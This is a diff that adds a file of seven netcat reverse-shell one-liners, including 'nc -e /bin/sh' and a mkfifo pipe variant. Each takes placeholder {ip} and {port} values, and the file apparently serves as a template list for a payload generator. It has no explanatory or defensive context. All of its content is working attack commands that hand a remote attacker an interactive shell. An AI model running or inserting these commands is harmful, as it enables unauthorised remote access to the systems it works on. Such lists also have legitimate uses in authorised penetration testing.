@@ -1,0 +1,13 @@
+nc -e /bin/sh {ip} {port}
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
+
+/bin/sh | nc {ip} {port}
+
+nc -c /bin/sh {ip} {port}
+
+nc.traditional -e /bin/sh {ip} {port}
+
+nc.traditional -c /bin/sh {ip} {port}
+
+nc -e /bin/sh [{ip}] {port}
